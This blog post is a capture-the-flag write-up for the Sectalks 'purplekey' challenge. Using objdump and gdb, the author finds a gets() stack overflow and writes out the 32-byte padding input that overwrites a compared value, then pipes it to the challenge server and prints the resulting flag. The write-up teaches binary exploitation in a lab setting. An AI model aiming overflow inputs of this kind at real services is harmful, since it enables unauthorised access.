---
layout: post
title: "Sectalks 0x13 purplekey write up"
description: "sectalks 0x13 purplekey write up"
category: writeups
tags: [boot2root, vulnhub]
---
At sectalks this month ceyx gave great talk on binary exploitation for beginners.
In this two part blog post, I'll be documenting my findings for the two challenges I worked on.

The first challenge named "purplekey" is a standard ELF executable.

```
root@kali:~/sectalks# file purplekey
purplekey: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.35, BuildID[sha1]=25be0cc5aa2121ba25d77660b8d9404f44c362a3, not stripped
```
Running strings on the executable we see that it'll likely ask us for a key and depending on if the inputted key is correct, it'll print the contents of /home/purplekey/flag.

```
root@kali:~/sectalks# strings purplekey
---8<---
FAIL
=1337us
[^_]
[+] Starting boot sequence...
[!] Welcome to InsecureBoot v1.337
Enter key:
> Key provided is: %s
/home/purplekey/flag
[!] You're not BillyG, who are you?
---8<---

```
To make sure the binary works as expected, I've created the file /home/purplekey/flag with the contents "You win".
Now lets actually run the binary and see what happens.

```
root@kali:~/sectalks# ./purplekey
[+] Starting boot sequence...
[!] Welcome to InsecureBoot v1.337
Enter key: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> Key provided is: AAAAAAA
[!] You're not BillyG, who are you?
```
It looks like it's taking our inputted string, truncating it and comparing it to something.
Using objdump, let's dissassemble the binary and find the location of the comparision.

```
root@kali:~/sectalks# objdump -M intel -D purplekey
---8<---
08048560 <main>:
 80485b3:       01 c2                   add    edx,eax
 80485b5:       c7 04 24 34 87 04 08    mov    DWORD PTR [esp],0x8048734
 80485bc:       e8 5f fe ff ff          call   8048420 <puts@plt>               ;print a line
 80485c1:       c7 04 24 54 87 04 08    mov    DWORD PTR [esp],0x8048754
 80485c8:       e8 53 fe ff ff          call   8048420 <puts@plt>               ;print a line
 80485cd:       c7 04 24 77 87 04 08    mov    DWORD PTR [esp],0x8048777
 80485d4:       e8 07 fe ff ff          call   80483e0 <printf@plt>             ;print a line
 80485d9:       8d 84 24 18 01 00 00    lea    eax,[esp+0x118]
 80485e0:       89 04 24                mov    DWORD PTR [esp],eax
 80485e3:       e8 08 fe ff ff          call   80483f0 <gets@plt>               ;reads our input
 80485e8:       8d 84 24 38 01 00 00    lea    eax,[esp+0x138]
 80485ef:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80485f3:       c7 04 24 83 87 04 08    mov    DWORD PTR [esp],0x8048783
 80485fa:       e8 e1 fd ff ff          call   80483e0 <printf@plt>             ;print a line
 80485ff:       8b 84 24 38 01 00 00    mov    eax,DWORD PTR [esp+0x138]
 8048606:       3d 31 33 33 37          cmp    eax,0x37333331                   ;perform a comparision
 804860b:       75 73                   jne    8048680 <main+0x120>             ;if the comparision succeeds jump to the code which prints the flag
---8<---
```
Now that we know the address of the comparision, let's generate an input file to test.
```
root@kali:~/sectalks# echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > input
root@kali:~/sectalks# gdb -q purplekey
Reading symbols from purplekey...(no debugging symbols found)...done.
```

Set a breakpoint at the comparision at 0x8048606

```
gdb-peda$ b *0x8048606
Breakpoint 1 at 0x8048606
```
Finally, let's run the executable with the generated input file.

```
gdb-peda$ r < input
Starting program: /root/sectalks/purplekey < input
[+] Starting boot sequence...
[!] Welcome to InsecureBoot v1.337
Enter key: > Key provided is: AAAAAAAAAAA
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0x20 (' ')
ECX: 0xffffb06f --> 0x0
EDX: 0xf7fac870 --> 0x0
ESI: 0x1
EDI: 0xf7fab000 --> 0x1b3db0
EBP: 0xffffd6b8 --> 0x0
ESP: 0xffffd570 --> 0x8048783 ("> Key provided is: %s\n")
EIP: 0x8048606 (<main+166>:     cmp    eax,0x37333331)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485f3 <main+147>:        mov    DWORD PTR [esp],0x8048783
   0x80485fa <main+154>:        call   0x80483e0 <printf@plt>
   0x80485ff <main+159>:        mov    eax,DWORD PTR [esp+0x138]
=> 0x8048606 <main+166>:        cmp    eax,0x37333331
   0x804860b <main+171>:        jne    0x8048680 <main+288>
   0x804860d <main+173>:        lea    ebx,[esp+0x18]
   0x8048611 <main+177>:        mov    eax,0x0
   0x8048616 <main+182>:        mov    edx,0x40
[------------------------------------stack-------------------------------------]
0000| 0xffffd570 --> 0x8048783 ("> Key provided is: %s\n")
0004| 0xffffd574 --> 0xffffd6a8 ('A' <repeats 11 times>)
0008| 0xffffd578 --> 0xf7e04564 --> 0x72647800 ('')
0012| 0xffffd57c --> 0xf7fd4858 --> 0xf7df7000 --> 0x464c457f
0016| 0xffffd580 --> 0xffffd5d4 --> 0x0
0020| 0xffffd584 --> 0xffffd5d0 --> 0x0
0024| 0xffffd588 --> 0x3
0028| 0xffffd58c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048606 in main ()
```
As we can the program is comparing part of our input stored in EAX with the static value 0x37333331.
We could rerun the binary several times to calculate where the program was taking the value 0x41414141 from but it's faster to use the pattern_create/pattern_search features to find the exact offset.

```
gdb-peda$ pattern_create 100 input
Writing pattern of 100 chars to filename "input"
gdb-peda$ r < input
Starting program: /root/sectalks/purplekey < input
[+] Starting boot sequence...
[!] Welcome to InsecureBoot v1.337
Enter key: > Key provided is: A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
[----------------------------------registers-----------------------------------]
EAX: 0x41412941 ('A)AA')
EBX: 0x20 (' ')
ECX: 0xffffb0a8 --> 0x0
EDX: 0xf7fac870 --> 0x0
ESI: 0x1
EDI: 0xf7fab000 --> 0x1b3db0
EBP: 0xffffd6b8 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xffffd570 --> 0x8048783 ("> Key provided is: %s\n")
EIP: 0x8048606 (<main+166>:     cmp    eax,0x37333331)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485f3 <main+147>:        mov    DWORD PTR [esp],0x8048783
   0x80485fa <main+154>:        call   0x80483e0 <printf@plt>
   0x80485ff <main+159>:        mov    eax,DWORD PTR [esp+0x138]
=> 0x8048606 <main+166>:        cmp    eax,0x37333331
   0x804860b <main+171>:        jne    0x8048680 <main+288>
   0x804860d <main+173>:        lea    ebx,[esp+0x18]
   0x8048611 <main+177>:        mov    eax,0x0
   0x8048616 <main+182>:        mov    edx,0x40
[------------------------------------stack-------------------------------------]
0000| 0xffffd570 --> 0x8048783 ("> Key provided is: %s\n")
0004| 0xffffd574 --> 0xffffd6a8 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd578 --> 0xf7e04564 --> 0x72647800 ('')
0012| 0xffffd57c --> 0xf7fd4858 --> 0xf7df7000 --> 0x464c457f
0016| 0xffffd580 --> 0xffffd5d4 --> 0x0
0020| 0xffffd584 --> 0xffffd5d0 --> 0x0
0024| 0xffffd588 --> 0x3
0028| 0xffffd58c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048606 in main ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
EAX+0 found at offset: 32
Registers point to pattern buffer:
[EBP] --> offset 48 - size ~52
Pattern buffer found at:
0xf7fd2000 : offset    0 - size  100 (mapped)
0xffffb063 : offset   32 - size   68 ($sp + -0x250d [-2372 dwords])
0xffffd688 : offset    0 - size  100 ($sp + 0x118 [70 dwords])
References to pattern buffer found at:
0xf7fab5a4 : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xf7fab5a8 : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xf7fab5ac : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xf7fab5b0 : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xf7fab5b4 : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xf7fab5b8 : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xf7fab5bc : 0xf7fd2000 (/lib/i386-linux-gnu/libc-2.22.so)
0xffffd404 : 0xf7fd2000 ($sp + -0x16c [-91 dwords])
0xffffd420 : 0xf7fd2000 ($sp + -0x150 [-84 dwords])
0xffffd434 : 0xf7fd2000 ($sp + -0x13c [-79 dwords])
0xffffaa40 : 0xffffb063 ($sp + -0x2b30 [-2764 dwords])
```
We see that after 32 bytes of input our input is being loaded into EAX for comparision.
Now that we know the offset that the string is being loaded from and the correct string that it's being compared to, we can generate an input which should pass the comparision.

```
root@kali:~/sectalks# python -c 'print "A"*32 + "1337"' | ./purplekey
[+] Starting boot sequence...
[!] Welcome to InsecureBoot v1.337
Enter key: > Key provided is: 1337
You win
```
OK, so it worked. Let's try against the actual ctf server to get the flag.

```
root@kali:~/sectalks# python -c 'print "A"*32 + "1337"' | nc -v hack.sydney 9001
DNS fwd/rev mismatch: hack.sydney != ec2-52-62-2-205.ap-southeast-2.compute.amazonaws.com
hack.sydney [52.62.2.205] 9001 (?) open
[+] Starting boot sequence...
[!] Welcome to InsecureBoot v1.337
Enter key: > Key provided is: 1337
hack.Sydney{fB1_t01d_m3_b4ckd00r5_w3r3_s4f3_wh4t_w3nt_wr0ng}
```
The flag for purplekey is **hack.Sydney{fB1_t01d_m3_b4ckd00r5_w3r3_s4f3_wh4t_w3nt_wr0ng}**
